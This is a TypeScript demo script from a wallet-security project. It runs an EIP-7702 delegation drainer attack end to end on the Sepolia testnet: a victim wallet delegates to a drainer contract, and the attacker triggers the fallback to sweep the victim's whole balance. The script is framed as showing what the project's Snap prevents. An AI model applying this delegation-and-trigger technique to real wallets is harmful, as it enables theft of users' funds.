#!/usr/bin/env bun
/**
 * drain't · Live drain demo on Ethereum Sepolia
 *
 * Reproduces a real EIP-7702 delegation drainer attack against a victim
 * wallet. Companion to /honeypot — that page demonstrates drain't's Snap
 * BLOCKING the attack pre-sign; this script shows what happens when nobody
 * is watching:
 *
 *   1. Victim signs a 7702 authorization delegating their EOA to CrimeEnjoyor
 *   2. Upgrade tx broadcast → victim's bytecode is now drainer logic
 *   3. Attacker sends a small "gas dust" ETH → triggers fallback
 *   4. Fallback forwards the victim's ENTIRE ETH balance to a burn address
 *   5. Victim signs revoke; attacker broadcasts (victim is now 0 ETH)
 *   6. Victim restored to plain EOA
 *
 * Safety: by default uses an ephemeral (newly generated) victim wallet, so
 * the only ETH at risk is what you explicitly transfer in. Pass
 * VICTIM_PRIVATE_KEY env to drain a specific wallet.
 *
 * Run:
 *   ATTACKER_PRIVATE_KEY=<0x...> bun run scripts/demo-drain.ts
 * Or with a specific victim:
 *   ATTACKER_PRIVATE_KEY=<0x...> VICTIM_PRIVATE_KEY=<0x...> bun run scripts/demo-drain.ts
 *
 * ATTACKER_PRIVATE_KEY defaults to PRIVATE_KEY from .env (the deployer).
 */

import {
  createWalletClient,
  formatEther,
  http,
  parseEther,
  publicActions,
} from "viem";
import { generatePrivateKey, privateKeyToAccount } from "viem/accounts";
import { sepolia } from "viem/chains";

const RPC =
  process.env.ETHEREUM_SEPOLIA_RPC_URL ||
  "https://ethereum-sepolia-rpc.publicnode.com";

const CRIME_ENJOYOR =
  "0xae5d26e8bdfe3bfeed4c9a27c2394dbb2f70fd73" as `0x${string}`;
const DEAD_SINK =
  "0x000000000000000000000000000000000000dEaD" as `0x${string}`;
const ZERO = "0x0000000000000000000000000000000000000000" as `0x${string}`;

function normalizePK(raw: string | undefined): `0x${string}` | null {
  if (!raw) return null;
  const trimmed = raw.trim();
  if (/^0x[a-fA-F0-9]{64}$/.test(trimmed)) return trimmed as `0x${string}`;
  if (/^[a-fA-F0-9]{64}$/.test(trimmed)) return `0x${trimmed}` as `0x${string}`;
  return null;
}

const attackerPK = normalizePK(
  process.env.ATTACKER_PRIVATE_KEY ?? process.env.PRIVATE_KEY,
);
if (!attackerPK) {
  console.error(
    "Set ATTACKER_PRIVATE_KEY (or PRIVATE_KEY) in env — 64-char hex, optional 0x prefix.",
  );
  process.exit(1);
}

let victimPK = normalizePK(process.env.VICTIM_PRIVATE_KEY);
let usingEphemeral = false;
if (!victimPK) {
  victimPK = generatePrivateKey();
  usingEphemeral = true;
}

const attacker = privateKeyToAccount(attackerPK);
const victim = privateKeyToAccount(victimPK);

const attackerClient = createWalletClient({
  account: attacker,
  chain: sepolia,
  transport: http(RPC),
}).extend(publicActions);
const victimClient = createWalletClient({
  account: victim,
  chain: sepolia,
  transport: http(RPC),
}).extend(publicActions);

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

async function balOf(addr: `0x${string}`): Promise<bigint> {
  return await attackerClient.getBalance({ address: addr });
}

async function codeOf(addr: `0x${string}`): Promise<string> {
  const c = await attackerClient.getCode({ address: addr });
  return c ?? "0x";
}

function fmt(wei: bigint): string {
  return `${formatEther(wei).padStart(20)} SETH`;
}

console.log(`
╔══════════════════════════════════════════════════════════════════╗
║   drain't · CrimeEnjoyor EIP-7702 drainer LIVE DEMO (Sepolia)    ║
║                                                                  ║
║   ⚠️   This script will drain the victim wallet's ETH balance.    ║
║       Counterpart demo to /honeypot Snap WARNING — proves what   ║
║       happens when nobody warns the user.                        ║
╚══════════════════════════════════════════════════════════════════╝

Attacker (deployer):  ${attacker.address}
Victim:               ${victim.address}${usingEphemeral ? "  (ephemeral)" : ""}
Drainer (CrimeEnjoyor): ${CRIME_ENJOYOR}
Sink (burn address):  ${DEAD_SINK}
`);

const attackerBalStart = await balOf(attacker.address);
const victimBalStart = await balOf(victim.address);
const sinkBalStart = await balOf(DEAD_SINK);

console.log("─── PRE-ATTACK BALANCES ──────────────────────────────────────────");
console.log(`Attacker:  ${fmt(attackerBalStart)}`);
console.log(`Victim:    ${fmt(victimBalStart)}`);
console.log(`Sink:      ${fmt(sinkBalStart)}`);

// ─── Step 0: fund victim if ephemeral ─────────────────────────────

if (usingEphemeral) {
  if (victimBalStart === 0n) {
    if (attackerBalStart < parseEther("0.015")) {
      console.error(
        "\nAttacker needs ≥ 0.015 SETH to fund victim + gas. Faucet first.",
      );
      process.exit(1);
    }
    console.log(`\nStep 0: attacker funds ephemeral victim with 0.01 SETH...`);
    const fundHash = await attackerClient.sendTransaction({
      to: victim.address,
      value: parseEther("0.01"),
      data: "0x",
    });
    console.log(`  fund tx: ${fundHash}`);
    await attackerClient.waitForTransactionReceipt({ hash: fundHash });
    console.log(`  ✓ victim now has ${fmt(await balOf(victim.address))}`);
  }
}

if (victimBalStart < parseEther("0.003") && !usingEphemeral) {
  console.error(
    `\nVictim needs ≥ 0.003 SETH for gas. Current: ${fmt(victimBalStart)}`,
  );
  process.exit(1);
}

// ─── Step 1+2: victim signs + broadcasts upgrade auth ─────────────

console.log(
  "\nStep 1: victim signs EIP-7702 authorization (delegate to CrimeEnjoyor)...",
);
const upgradeAuth = await victimClient.signAuthorization({
  contractAddress: CRIME_ENJOYOR,
  executor: "self",
});
console.log(
  `  auth chainId=${upgradeAuth.chainId} target=${upgradeAuth.contractAddress} nonce=${upgradeAuth.nonce}`,
);

console.log(
  "\nStep 2: victim broadcasts type-0x04 tx with the authorization...",
);
const upgradeTxHash = await victimClient.sendTransaction({
  authorizationList: [upgradeAuth],
  to: victim.address,
  data: "0x",
});
console.log(`  upgrade tx: ${upgradeTxHash}`);
await victimClient.waitForTransactionReceipt({ hash: upgradeTxHash });
const codeAfterUpgrade = await codeOf(victim.address);
console.log(
  `  ✓ victim bytecode (first 12 bytes): ${codeAfterUpgrade.slice(0, 26)}`,
);
if (codeAfterUpgrade.toLowerCase().startsWith("0xef0100")) {
  console.log(`  ✓ 0xef0100 prefix detected — victim is now a smart EOA`);
} else {
  console.error(
    `  ✗ Upgrade may have failed. Expected 0xef0100... prefix. Got: ${codeAfterUpgrade.slice(0, 20)}`,
  );
  process.exit(1);
}

// ─── Step 3: attacker triggers drain ──────────────────────────────

console.log(
  "\nStep 3: attacker sends 0.0001 SETH 'gas dust' to victim — fallback fires...",
);
const balBeforeDrain = await balOf(victim.address);
const triggerTxHash = await attackerClient.sendTransaction({
  to: victim.address,
  value: parseEther("0.0001"),
  // Non-empty calldata that doesn't match any selector forces dispatch into
  // fallback() (not receive()). CrimeEnjoyorMock's fallback drains the
  // ENTIRE balance, while receive() only forwards msg.value. Real-world
  // sweeper-bot drains tend to call with crafted data for this reason.
  data: "0xdeadbeef",
});
console.log(`  trigger tx: ${triggerTxHash}`);
await attackerClient.waitForTransactionReceipt({ hash: triggerTxHash });
await sleep(1500);

const balAfterDrain = await balOf(victim.address);
const sinkAfterDrain = await balOf(DEAD_SINK);
const drained = balBeforeDrain + parseEther("0.0001") - balAfterDrain;

console.log("\n─── DRAIN OUTCOME ────────────────────────────────────────────────");
console.log(`Victim before:    ${fmt(balBeforeDrain)}`);
console.log(`Victim after:     ${fmt(balAfterDrain)}`);
console.log(`Sink before:      ${fmt(sinkBalStart)}`);
console.log(`Sink after:       ${fmt(sinkAfterDrain)}`);
console.log(`\n🚨 DRAINED:       ${fmt(drained)} → ${DEAD_SINK}`);
console.log(`   tx ${triggerTxHash}`);
console.log(
  `   explorer: https://sepolia.etherscan.io/tx/${triggerTxHash}`,
);

// ─── Step 4: revoke 7702 (attacker pays gas since victim is drained) ──

console.log("\nStep 4: victim signs revoke (delegate → address(0))...");
const revokeAuth = await victimClient.signAuthorization({
  contractAddress: ZERO,
  // The victim's current nonce is referenced; executor != self lets
  // anyone broadcast, since victim now has no ETH for gas.
  executor: attacker.address,
});
console.log(
  `  revoke auth chainId=${revokeAuth.chainId} target=${revokeAuth.contractAddress} nonce=${revokeAuth.nonce}`,
);

console.log("Step 5: attacker broadcasts revoke tx (victim is broke)...");
try {
  const revokeTxHash = await attackerClient.sendTransaction({
    authorizationList: [revokeAuth],
    to: victim.address,
    data: "0x",
  });
  console.log(`  revoke tx: ${revokeTxHash}`);
  await attackerClient.waitForTransactionReceipt({ hash: revokeTxHash });
  const codeAfterRevoke = await codeOf(victim.address);
  if (codeAfterRevoke === "0x" || codeAfterRevoke === "") {
    console.log(`  ✓ victim is back to a plain EOA (bytecode empty)`);
  } else {
    console.log(`  ⚠ victim bytecode after revoke: ${codeAfterRevoke}`);
  }
} catch (err) {
  console.error(
    `  ✗ revoke failed: ${err instanceof Error ? err.message : err}`,
  );
  console.log(
    `  Victim still 7702-delegated. ETH sent there will continue draining.`,
  );
}

// ─── Final state ──────────────────────────────────────────────────

console.log(
  "\n─── FINAL BALANCES ───────────────────────────────────────────────",
);
console.log(`Attacker:         ${fmt(await balOf(attacker.address))}`);
console.log(`Victim:           ${fmt(await balOf(victim.address))}`);
console.log(`Sink:             ${fmt(await balOf(DEAD_SINK))}`);
console.log(
  `\n${usingEphemeral ? "(Ephemeral victim — abandon address.)" : ""}`,
);
console.log("\nDemo complete. This is the attack drain't prevents.");
